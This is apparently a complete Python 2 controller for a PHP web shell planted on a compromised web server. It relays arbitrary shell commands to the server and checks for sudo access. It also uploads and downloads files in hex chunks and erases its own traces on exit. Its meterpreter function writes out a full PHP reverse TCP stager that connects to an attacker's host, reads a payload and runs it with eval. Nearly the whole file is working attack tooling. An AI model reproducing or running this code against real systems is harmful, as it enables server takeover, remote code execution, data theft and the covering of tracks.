#!/usr/bin/env python

import os, sys, getopt, urllib, urllib2, re, socket, binascii, hashlib, math

global_url = ""
initial_path = ""
shell_path = ""
working_directory = ""

help_notes = """
  Simple Shell (Controller) 0.1
  -----------------------------
  Created by: z0noxz
  https://github.com/z0noxz/smplshllctrlr

  Usage: (python) simple-shell-controller.py [options]

  Options:
    --help                Show this help message and exit
    --url                 Shell interface URL without paramters (e.g. "http://www.site.com/simple-shell.php")
    
    Shell commands:
      Commands that are executable while in shell interface
      
      meterpreter         Injects a PHP Meterpreter, PHP Reverse TCP Stager (requires a listener for php/meterpreter/reverse_tcp)
      upload              Upload a file
      download            Download a file
      kill_self           Cleans up traces and aborts the shell
      exit                Exits the shell
"""

def execute_command(cmd, verbose = True):
	global global_url
	
	output = urllib2.urlopen(global_url + ("?cmd=" + urllib.quote_plus(cmd) if not cmd == None else "")).read()
	if (verbose): print output
	return output
		
def split(str, num):
    return [ str[start:start+num] for start in range(0, len(str), num) ]

def check_working_directory(working_directory, new_directory):
	
	new_directory = new_directory if not new_directory == "" else working_directory
	
	if (re.match("^(/[^/ ]*)+/?$", new_directory)):
		if (execute_command("if test -d " + new_directory + "; then \"1\"; fi", False) == ""):
			return new_directory
	
	return working_directory

def inject_meterpreter_shell():
	global global_url, working_directory, initial_path
	
	print("\n  PHP Meterpreter Injection:\n  --------------------------")
	
	### TODO :: Extend function to include meterpreter injections of types: ASP, JSP etc.
	### type = raw_input("  TYPE: ") ,or could be automatic as the shell interface is identifiable (e.g. simple-shell.php => PHP)
	lhost = raw_input("  LHOST: ")
	lport = raw_input("  LPORT: ")
	print("\n  Initializing...")
	
	## Define shell
	print("  Preparing shell...")
	shell = "<?php error_reporting(0); $ip = '" + lhost + "'; $port = " + lport + "; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f('tcp://{$ip}:{$port}'); $s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } elseif (($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack('Nlen', $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();?>"
	
	## Move to initial_path
	execute_command("cd " + initial_path, False)
	
	## Remove if shell allready exists
	print("  Removing previous shell, if one exists...")
	execute_command("rm met.php", False)

	## Upload meterpreter shell
	print("  Uploading shell to server...")
	execute_command("echo $\"" + shell.replace("$", "\$") + "\" >> met.php", False)

	## Replace quotes to make the shell executable
	print("  Arming shell...")
	execute_command("sed -i -- \"s/'/\\\"/g\" met.php", False)

	## Execute meterpreter shell
	print("  Executing shell...")
	
	try:
		err = re.sub("<[^>]*>", "", urllib2.urlopen(global_url[:global_url.rfind("/")] + "/met.php", "", 1).read()).strip()
		if not err == "":
			print("  \033[91mError: " + err + "\033[0m")
	except urllib2.URLError, e:
		if isinstance(e.reason, socket.timeout):
			print("  \033[92mShell appears to have executed successfully!\033[0m")
	except socket.timeout, e:
		print("  \033[92mShell appears to have executed successfully!\033[0m")
			
	## Return to working_directory
	execute_command("cd " + working_directory, False)
		
def file_upload():
	global global_url
	
	print("\n  File Uploader:\n  --------------")
	
	lpath = raw_input("  Local path: ")
	file_name = lpath[lpath.rfind("/") + 1:]
	print("\n  Initializing...")
	
	try:
		with open(lpath, "rb") as f:

			print("\n  Uploading '" + file_name + "'...")

			counter = 1
			step = 1
			chunk_size = 32
			progress_width = 64
			file_size = os.path.getsize(lpath)
			chunk_count = math.ceil(file_size / chunk_size)
			local_hash_md5 = hashlib.md5()

			## Setup progress bar
			sys.stdout.write("  [%s]" % (" " * progress_width))
			sys.stdout.flush()
			sys.stdout.write("\b" * (progress_width + 1))

			execute_command("cd " + working_directory + " && rm " + file_name, False)
			execute_command("cd " + working_directory + " && touch " + file_name, False)

			while True:
				chunk = f.read(chunk_size)
				local_hash_md5.update(chunk)

				if chunk:				
					chunk = binascii.hexlify(chunk)
					chunk = "\\x" + "\\x".join([chunk[i:i + 2] for i in range(0, len(chunk), 2)])

					execute_command("cd " + working_directory + " && echo -n -e '" + chunk + "' >> " + file_name, False)

					if ((counter / (chunk_count / progress_width)) > step):
						sys.stdout.write("=")
						sys.stdout.flush()
						step += 1
					counter += 1
				else:
					break

			sys.stdout.write("\b" * (step - 1))		
			sys.stdout.flush()
			sys.stdout.write(("\033[92m=\033[0m" * progress_width))
			sys.stdout.write("\n")
			
			print("\n  Analysing file integrity...")
			print("  \033[92mFile is OK!\033[0m" if (str(execute_command("cd " + working_directory + " && md5sum " + file_name + " | awk '{ print $1 }'", False)).strip() == str(local_hash_md5.hexdigest()).strip()) else "  \033[91mFile is not OK!\033[0m")
	except IOError:
		print("  \033[91mError: cannot open '" + file_name + "'\033[0m")

def file_download():
	global global_url, working_directory
	
	print("\n  File Downloader:\n  ----------------")
	
	rpath = raw_input("  Remote path: ")
	file_name = rpath[rpath.rfind("/") + 1:]
	print("\n  Initializing...")	
		
	try:		
		print("\n  Downloading '" + file_name + "'...")

		counter = 1
		step = 1
		chunk_size = 32
		progress_width = 64
		file_size = int(execute_command("cd " + working_directory + " && stat -c%s " + rpath, False))
		chunk_count = math.ceil(file_size / chunk_size)
		local_hash_md5 = hashlib.md5()

		## Setup progress bar
		sys.stdout.write("  [%s]" % (" " * progress_width))
		sys.stdout.flush()
		sys.stdout.write("\b" * (progress_width + 1))
		
		try: os.remove(file_name)
		except OSError: pass
		
		while True:
			chunk = execute_command("cd " + working_directory + " && hexdump -ve '1/1 \"%.2x\"' " + rpath + " -n " + str(chunk_size) + " -s " + str(chunk_size * (counter - 1)), False)		

			if (not chunk == ""): 
				with open(file_name, "ab") as f:
					f.write(binascii.unhexlify(chunk))
				
				if ((counter / (chunk_count / progress_width)) > step):
					sys.stdout.write("=")
					sys.stdout.flush()
					step += 1
				counter += 1
			else:
				break
		
		sys.stdout.write("\b" * (step - 1))		
		sys.stdout.flush()
		sys.stdout.write(("\033[92m=\033[0m" * progress_width))
		sys.stdout.write("\n")
		
		print("\n  Analysing file integrity...")		

		local_hash_md5 = hashlib.md5()
		with open(file_name, "rb") as f:
			local_hash_md5.update(f.read())
			
		print("  \033[92mFile is OK!\033[0m" if (str(execute_command("cd " + working_directory + " && md5sum " + rpath + " | awk '{ print $1 }'", False)).strip() == str(local_hash_md5.hexdigest()).strip()) else "  \033[91mFile is not OK!\033[0m")
	
	except IOError:
		print("  \033[91mError: cannot download file '" + file_name + "'\033[0m")

def kill_self():
	global global_url, initial_path, shell_path
	
	print("\n  Kill Self Protocol:\n  -------------------")
	
	## Remove shells
	sys.stdout.write("  Removing extra shells...                  ")
	execute_command("rm " + initial_path + "/met.php", False)
	print("[\033[92mOK\033[0m]")
	
	## Remove self
	sys.stdout.write("  Removing initial shell...                 ")
	execute_command("rm " + shell_path, False)
	print("[\033[92mOK\033[0m]")
	
	## Shutting down
	print("  Shutting down...")
	sys.exit()
	
def main(argv):
	global global_url, initial_path, shell_path, working_directory
	
	try:
		opts, args = getopt.getopt(argv, "",
		[
			"help",
			"url=",
		])
	except getopt.GetoptError, err:
		print help_notes
		print err
		sys.exit(2)
	for opt, arg in opts:
		if opt in ("--help"):
			print help_notes
			sys.exit()
		elif opt in ("--url"): global_url = arg

	if (not global_url == ""):
		
		try:
			urllib2.urlopen(global_url).read()
		except urllib2.URLError, e:
			print "\n  \033[91mCannot access the interface\033[0m"
			sys.exit(2)
			
		
		working_directory = execute_command("pwd", False).strip()
		initial_path = working_directory
		shell_path = initial_path + global_url[global_url.rfind("/"):]
		
		def _command(x = None):			
			cmds = {
				"meterpreter": inject_meterpreter_shell,
				"upload": file_upload,
				"download": file_download,
				"kill_self": kill_self,
				"exit": sys.exit,
			}
			
			if (not x == None):
				fnc = cmds.get(x, None)				
				if (not fnc == None): 
					fnc()
					return True
				else:
					return False
			else:
				return sorted(cmds.keys(), key = lambda k: cmds[k])
		
		print ""
		print "  SHELL    : " + shell_path
		print "  ID       : " + execute_command("id", False).strip()
		print "  SUDO     : " + ("\033[92mAccess granted\033[0m" if execute_command("timeout 2 sudo id && echo 1 || echo 0", False) == "1" else "\033[91mAccess denied\033[0m")
		print ""
		print "  COMMANDS : " + "\n             ".join(_command())
		print ""
		
		while (True):
			user_input = raw_input("ssc [\033[94m" + working_directory + "\033[0m] > ")
			
			if (not _command(user_input)):
				output = execute_command("cd " + working_directory + " && " + user_input + " && pwd", False).strip().split("\n")
				working_directory = check_working_directory(working_directory, output[len(output) - 1])

				print "  " + "\n  ".join(output[:len(output) - 1])
			else:
				print ""
			
if __name__ == "__main__": main(sys.argv[1:])